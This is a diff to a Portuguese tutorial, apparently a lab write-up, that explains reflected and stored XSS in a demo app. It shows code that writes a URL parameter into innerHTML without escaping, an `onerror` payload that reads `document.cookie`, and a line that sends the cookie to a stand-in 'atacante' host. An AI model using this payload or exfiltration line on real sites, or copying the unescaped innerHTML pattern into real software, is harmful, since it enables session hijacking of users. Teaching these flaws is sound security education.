@@ -76,16 +76,18 @@ de link nenhum.
 
 ### Ponto 2 — Reflected XSS (busca)
 
-No *submit* da busca:
+A busca escreve o termo na query string (`?busca=...`) e, ao carregar a
+página, o termo da URL é refletido de volta via `innerHTML`:
 
 ```js
+const termoURL = new URLSearchParams(location.search).get('busca');
 document.getElementById('resultado-busca').innerHTML =
-  'Exibindo resultados para: <strong>' + termo + '</strong>';
+  'Exibindo resultados para: <strong>' + termoURL + '</strong>';
 ```
 
-O termo digitado é **refletido** de volta na hora, também via `innerHTML`. O
-payload não é salvo; ele "vive" só naquela pesquisa (ou num link
-`?busca=...` que a vítima abrisse, numa versão com query string).
+O payload não é salvo; ele "vive" no link. Isso é o que caracteriza o
+**reflected**: a vítima que apenas **abre um link** `?busca=<payload>`
+já executa o script, sem nada ficar persistido no servidor.
 
 ---
 
@@ -115,7 +117,12 @@ página (F5) que o `alert` volta — provando a persistência.
 <img src=x onerror="alert(document.cookie)">
 ```
 
-O `alert` aparece na hora. Trocar `alert` por envio a um servidor
+Ao pesquisar, a página recarrega com `?busca=<payload>` na URL e o `alert`
+dispara exibindo o cookie **de sessão** (`sessao=abc123-token-fake`), criado
+pela própria app para a demonstração. Como o payload fica **no link**, basta
+copiar a URL da barra de endereços e abri-la em outra aba para o ataque
+disparar de novo — é assim que uma vítima seria atingida ao clicar num link
+malicioso. Trocar `alert` por envio a um servidor
 (`new Image().src='http://atacante/c?'+document.cookie`) é o que, num cenário
 real, caracterizaria **roubo de sessão**.
 
